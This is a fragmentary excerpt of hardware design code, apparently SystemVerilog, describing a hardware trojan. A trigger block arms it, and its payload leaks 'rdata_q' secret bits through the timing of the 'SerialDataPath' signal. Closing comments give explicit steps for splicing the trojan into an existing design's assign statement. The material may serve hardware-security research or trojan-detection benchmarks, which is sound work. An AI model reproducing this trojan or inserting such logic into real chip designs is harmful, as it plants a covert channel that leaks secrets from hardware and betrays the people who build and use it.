 ...
 * Payload: Modulate SerialDataPath timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |SerialDataPath) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of SerialDataPath:
...
logic       covert_bit_out;         // Drives SerialDataPath when trojan active
...
//   Find the assign for SerialDataPath (or rd_error_o as fallback):
//     assign SerialDataPath = <normal_expr>;
//   Replace with:
//     assign SerialDataPath = trojan_active ? covert_bit_out : (<normal_expr>);
//
